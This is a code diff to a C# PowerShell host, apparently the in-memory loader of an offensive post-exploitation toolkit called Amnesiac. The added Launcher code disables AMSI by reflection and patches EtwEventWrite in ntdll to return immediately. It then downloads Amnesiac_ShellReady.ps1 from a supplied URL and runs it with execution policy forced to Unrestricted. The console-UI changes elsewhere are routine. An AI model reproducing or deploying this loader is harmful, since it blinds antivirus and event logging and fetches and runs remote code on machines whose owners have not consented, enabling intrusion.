@@ -1,6 +1,6 @@
-// AmnesiacBridge — C# Runspace host loaded by amnesiac_launcher.exe via CLR.
-// Receives PS script content as a string (already downloaded in native code),
-// creates a full interactive PSHost, and runs the script + Amnesiac entry point.
+// AmnesiacBridge -- C# Runspace host loaded by amnesiac_launcher.exe via CLR.
+// Applies managed AMSI+ETW bypasses (safe in-process with CLR), then runs
+// Amnesiac_ShellReady.ps1 interactively via a full PSHost Runspace.
 // Target: net462 (runs on any Windows with .NET 4.6.2+)
 
 using System;
@@ -10,58 +10,68 @@ using System.Globalization;
 using System.Management.Automation;
 using System.Management.Automation.Host;
 using System.Management.Automation.Runspaces;
+using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security;
 
 namespace AmnesiacBridge
 {
     // ---------------------------------------------------------------------------
-    // Raw UI — delegates everything to System.Console
+    // Raw UI -- all properties safe for non-console / background-thread access
     // ---------------------------------------------------------------------------
     sealed class ConsoleRawUI : PSHostRawUserInterface
     {
+        static readonly Size _safe = new Size(120, 50);
+
         public override ConsoleColor BackgroundColor
         {
-            get => Console.BackgroundColor;
-            set => Console.BackgroundColor = value;
+            get { try { return Console.BackgroundColor; } catch { return ConsoleColor.Black; } }
+            set { try { Console.BackgroundColor = value; } catch { } }
         }
         public override ConsoleColor ForegroundColor
         {
-            get => Console.ForegroundColor;
-            set => Console.ForegroundColor = value;
+            get { try { return Console.ForegroundColor; } catch { return ConsoleColor.Gray; } }
+            set { try { Console.ForegroundColor = value; } catch { } }
         }
         public override Size BufferSize
         {
-            get => new Size(Console.BufferWidth, Console.BufferHeight);
+            get { try { return new Size(Console.BufferWidth, Console.BufferHeight); } catch { return _safe; } }
             set { try { Console.BufferWidth = value.Width; Console.BufferHeight = value.Height; } catch { } }
         }
         public override Size WindowSize
         {
-            get => new Size(Console.WindowWidth, Console.WindowHeight);
+            get { try { return new Size(Console.WindowWidth, Console.WindowHeight); } catch { return _safe; } }
             set { try { Console.WindowWidth = value.Width; Console.WindowHeight = value.Height; } catch { } }
         }
-        public override Size MaxWindowSize      => new Size(Console.LargestWindowWidth, Console.LargestWindowHeight);
+        public override Size MaxWindowSize
+        {
+            get { try { return new Size(Console.LargestWindowWidth, Console.LargestWindowHeight); } catch { return _safe; } }
+        }
         public override Size MaxPhysicalWindowSize => MaxWindowSize;
         public override Coordinates WindowPosition
         {
-            get => new Coordinates(Console.WindowLeft, Console.WindowTop);
+            get { try { return new Coordinates(Console.WindowLeft, Console.WindowTop); } catch { return new Coordinates(0, 0); } }
             set { try { Console.SetWindowPosition(value.X, value.Y); } catch { } }
         }
         public override string WindowTitle
         {
-            get => Console.Title;
-            set => Console.Title = value;
+            get { try { return Console.Title; } catch { return "Amnesiac"; } }
+            set { try { Console.Title = value; } catch { } }
         }
         public override Coordinates CursorPosition
         {
-            get => new Coordinates(Console.CursorLeft, Console.CursorTop);
+            get { try { return new Coordinates(Console.CursorLeft, Console.CursorTop); } catch { return new Coordinates(0, 0); } }
             set { try { Console.SetCursorPosition(value.X, value.Y); } catch { } }
         }
         public override int CursorSize
         {
-            get => Console.CursorSize;
+            get { try { return Console.CursorSize; } catch { return 25; } }
             set { try { Console.CursorSize = value; } catch { } }
         }
-        public override bool KeyAvailable => Console.KeyAvailable;
+        public override bool KeyAvailable
+        {
+            get { try { return Console.KeyAvailable; } catch { return false; } }
+        }
 
         public override void FlushInputBuffer() { }
 
@@ -83,7 +93,7 @@ namespace AmnesiacBridge
     }
 
     // ---------------------------------------------------------------------------
-    // User interface — delegates I/O to System.Console
+    // User interface -- delegates I/O to System.Console
     // ---------------------------------------------------------------------------
     sealed class ConsoleUI : PSHostUserInterface
     {
@@ -112,11 +122,9 @@ namespace AmnesiacBridge
         {
             var prevFg = Console.ForegroundColor;
             var prevBg = Console.BackgroundColor;
-            Console.ForegroundColor = fg;
-            Console.BackgroundColor = bg;
+            try { Console.ForegroundColor = fg; Console.BackgroundColor = bg; } catch { }
             Console.Write(value);
-            Console.ForegroundColor = prevFg;
-            Console.BackgroundColor = prevBg;
+            try { Console.ForegroundColor = prevFg; Console.BackgroundColor = prevBg; } catch { }
         }
 
         public override void WriteLine()                => Console.WriteLine();
@@ -126,16 +134,16 @@ namespace AmnesiacBridge
         public override void WriteWarningLine(string msg)
         {
             var prev = Console.ForegroundColor;
-            Console.ForegroundColor = ConsoleColor.Yellow;
+            try { Console.ForegroundColor = ConsoleColor.Yellow; } catch { }
             Console.WriteLine("[WARNING] " + msg);
-            Console.ForegroundColor = prev;
+            try { Console.ForegroundColor = prev; } catch { }
         }
         public override void WriteErrorLine(string value)
         {
             var prev = Console.ForegroundColor;
-            Console.ForegroundColor = ConsoleColor.Red;
+            try { Console.ForegroundColor = ConsoleColor.Red; } catch { }
             Console.Error.WriteLine(value);
-            Console.ForegroundColor = prev;
+            try { Console.ForegroundColor = prev; } catch { }
         }
         public override void WriteProgress(long sourceId, ProgressRecord record) { }
 
@@ -156,7 +164,7 @@ namespace AmnesiacBridge
         public override PSCredential PromptForCredential(
             string caption, string message, string userName, string targetName)
         {
-            Console.WriteLine(caption + " — " + message);
+            Console.WriteLine(caption + " -- " + message);
             Console.Write("Username [" + userName + "]: ");
             string u = Console.ReadLine();
             if (string.IsNullOrEmpty(u)) u = userName;
@@ -187,65 +195,150 @@ namespace AmnesiacBridge
     // ---------------------------------------------------------------------------
     sealed class ConsoleHost : PSHost
     {
-        private readonly Guid   _id  = Guid.NewGuid();
-        private readonly ConsoleUI _ui = new ConsoleUI();
+        private readonly Guid      _id  = Guid.NewGuid();
+        private readonly ConsoleUI _ui  = new ConsoleUI();
 
-        public override string           Name            => "AmnesiacLauncher";
-        public override Version          Version         => new Version(1, 0);
-        public override Guid             InstanceId      => _id;
-        public override PSHostUserInterface UI           => _ui;
-        public override CultureInfo      CurrentCulture  => CultureInfo.CurrentCulture;
-        public override CultureInfo      CurrentUICulture => CultureInfo.CurrentUICulture;
+        public override string              Name             => "AmnesiacLauncher";
+        public override Version             Version          => new Version(1, 0);
+        public override Guid                InstanceId       => _id;
+        public override PSHostUserInterface UI               => _ui;
+        public override CultureInfo         CurrentCulture   => CultureInfo.CurrentCulture;
+        public override CultureInfo         CurrentUICulture => CultureInfo.CurrentUICulture;
         public override void EnterNestedPrompt()    { }
         public override void ExitNestedPrompt()     { }
         public override void NotifyBeginApplication() { }
-        public override void NotifyEndApplication() { }
+        public override void NotifyEndApplication()   { }
         public override void SetShouldExit(int exitCode) => Environment.Exit(exitCode);
     }
 
     // ---------------------------------------------------------------------------
-    // Public entry point — called from C++ via CLR hosting
+    // Public entry point -- called from C++ via CLR hosting
     // ---------------------------------------------------------------------------
     public static class Launcher
     {
-        // scriptContent: UTF-8 content of Amnesiac_ShellReady.ps1 as a string
+        // -----------------------------------------------------------------------
+        // P/Invoke for managed ETW byte-patch
+        // -----------------------------------------------------------------------
+        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+        [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string proc);
+        [DllImport("kernel32.dll")] static extern bool   VirtualProtect(IntPtr addr, UIntPtr size, uint prot, out uint old);
+
+        // amsiInitFailed -- sets PS internal flag so AMSI is never initialised.
+        // This is the patchless AMSI bypass: no bytes written, no hooks installed.
+        static void DisableAmsi()
+        {
+            try
+            {
+                var utils = typeof(PowerShell).Assembly
+                    .GetType("System.Management.Automation.AmsiUtils");
+                var field = utils?.GetField("amsiInitFailed",
+                    BindingFlags.NonPublic | BindingFlags.Static);
+                field?.SetValue(null, true);
+            }
+            catch { }
+        }
+
+        static void PatchEtw()
+        {
+            try
+            {
+                var h    = GetModuleHandle("ntdll.dll");
+                var addr = GetProcAddress(h, "EtwEventWrite");
+                if (addr == IntPtr.Zero) return;
+                uint old;
+                VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
+                Marshal.WriteByte(addr, 0xC3);
+                VirtualProtect(addr, (UIntPtr)1, old, out old);
+            }
+            catch { }
+        }
+
+        // -----------------------------------------------------------------------
+        // Entry point called by ExecuteInDefaultAppDomain from native launcher.
+        // -----------------------------------------------------------------------
+        public static int RunFromUrl(string baseUrl)
+        {
+            string url = baseUrl.TrimEnd('/') + "/Amnesiac_ShellReady.ps1";
+            string scriptContent;
+            try
+            {
+                var wc = new System.Net.WebClient();
+                wc.Encoding = System.Text.Encoding.UTF8;
+                scriptContent = wc.DownloadString(url);
+            }
+            catch (Exception ex) { Console.Error.WriteLine("[-] Script download: " + ex.Message); return 1; }
+            Run(scriptContent);
+            return 0;
+        }
+
+        // scriptContent: UTF-8 content of Amnesiac_ShellReady.ps1
         public static void Run(string scriptContent)
         {
-            var host = new ConsoleHost();
-            var iss  = InitialSessionState.CreateDefault();
-
-            using (Runspace rs = RunspaceFactory.CreateRunspace(host, iss))
+            try
             {
-                rs.Open();
+                // Apply managed bypasses BEFORE Runspace opens.
+                // The native PAGE_GUARD VEH bypass was removed by launcher.cpp because
+                // VEH context manipulation is incompatible with the CLR's managed-to-unmanaged
+                // transition frame -- it causes an uncatchable AccessViolationException inside
+                // rs.Open() when AMSI initialization hits the guarded page.
+                DisableAmsi();  // amsiInitFailed=true  (patchless -- no bytes written)
+                PatchEtw();     // EtwEventWrite -> ret  (one-byte patch in managed code)
 
-                // Bypass execution policy without ExecutionPolicy property (PS5.1 compatible)
-                using (PowerShell bypass = PowerShell.Create())
+                var host = new ConsoleHost();
+                var iss  = InitialSessionState.CreateDefault();
+
+                using (Runspace rs = RunspaceFactory.CreateRunspace(host, iss))
                 {
-                    bypass.Runspace = rs;
-                    bypass.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force");
-                    bypass.Invoke();
-                }
+                    rs.Open();
 
-                using (PowerShell ps = PowerShell.Create())
-                {
-                    ps.Runspace = rs;
-
-                    // Load the script (defines Amnesiac function + globals)
-                    ps.AddScript(scriptContent);
-                    ps.Invoke();
-
-                    if (ps.HadErrors)
+                    using (PowerShell bypass = PowerShell.Create())
                     {
-                        foreach (var e in ps.Streams.Error)
-                            Console.Error.WriteLine("[-] Script error: " + e);
-                        return;
+                        bypass.Runspace = rs;
+                        bypass.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Unrestricted -Force");
+                        bypass.Invoke();
                     }
 
-                    // Invoke entry point
-                    ps.Commands.Clear();
-                    ps.AddCommand("Amnesiac");
-                    ps.Invoke();
+                    using (PowerShell ps = PowerShell.Create())
+                    {
+                        ps.Runspace = rs;
+
+                        ps.AddScript(scriptContent);
+                        ps.Invoke();
+
+                        if (ps.HadErrors)
+                        {
+                            foreach (var e in ps.Streams.Error)
+                                Console.Error.WriteLine("[-] Script error: " + e);
+                            return;
+                        }
+
+                        ps.Commands.Clear();
+                        ps.AddCommand("Amnesiac");
+
+                        var output = new PSDataCollection<PSObject>();
+                        output.DataAdded += (s, e) =>
+                        {
+                            var col = s as PSDataCollection<PSObject>;
+                            if (col == null) return;
+                            foreach (var item in col.ReadAll())
+                                if (item != null) Console.WriteLine(item.ToString());
+                        };
+                        ps.Streams.Error.DataAdded += (s, e) =>
+                        {
+                            var col = s as PSDataCollection<ErrorRecord>;
+                            if (col == null) return;
+                            foreach (var err in col.ReadAll())
+                                Console.Error.WriteLine("[-] " + err);
+                        };
+
+                        var async = ps.BeginInvoke<PSObject, PSObject>(null, output);
+                        ps.EndInvoke(async);
+                    }
                 }
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine("[-] " + ex.GetType().Name + ": " + ex.Message);
             }
         }
     }
